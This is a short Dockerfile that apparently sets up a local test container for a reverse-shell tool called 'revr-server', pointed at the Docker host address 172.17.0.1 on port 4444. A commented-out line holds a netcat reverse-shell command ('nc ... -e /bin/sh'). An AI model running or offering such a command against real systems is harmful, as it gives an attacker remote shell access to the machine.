FROM alpine:latest
# FROM ubuntu:latest

COPY ./server/revr-server ./revr-server

CMD ["/revr-server", "--ip", "172.17.0.1", "--port", "4444"]
# CMD ["/bin/sh"]
# CMD ["nc", "172.17.0.1", "4444" , "-e", "/bin/sh"]
